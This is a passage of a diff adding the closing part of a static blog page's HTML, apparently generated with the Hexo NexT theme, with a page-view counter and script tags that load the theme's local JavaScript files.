+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
